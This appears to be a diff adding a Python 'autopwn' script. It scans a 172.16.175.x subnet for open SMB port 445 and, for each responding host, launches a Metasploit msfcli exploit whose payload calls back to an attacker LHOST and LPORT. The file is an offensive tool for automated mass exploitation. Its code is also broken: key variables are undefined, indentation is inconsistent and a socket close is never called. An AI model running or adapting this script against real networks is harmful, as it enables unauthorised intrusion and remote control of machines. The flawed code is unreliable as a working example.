@@ -1,0 +1,30 @@
+#!/usr/bin/python
+
+import socket as sk
+import subprocess, shlex, os, time
+ 
+### Default Variables
+net="172.16.175"
+netStart=1
+netStop=254
+ 
+ 
+### Scans target network for open port 445
+def scanner(net, netStart, netStop):
+	print('running scanner')
+        for octect in range(netStart,netStop):
+                #test = net + '.' + str(octect)
+                try:
+                               
+			network = net + '.' + str(octect)
+			s=sk.socket(sk.AF_INET, sk.SOCK_STREAM)
+			s.settimeout(1)
+			s.connect((network, 445))
+			targets.append(network)
+			if(len(targets) != 0):
+				for target in targets:
+					### the autopwn
+					subprocess.Popen(shlex.split('msfcli {0} PAYLOAD={1} RHOST={2} LHOST={3} LPORT={4} DisablePayloadHandler=true E'.format(exploit, payload, target, lhost, lport)))
+					targets.pop(0)
+			s.close
+		except: continue
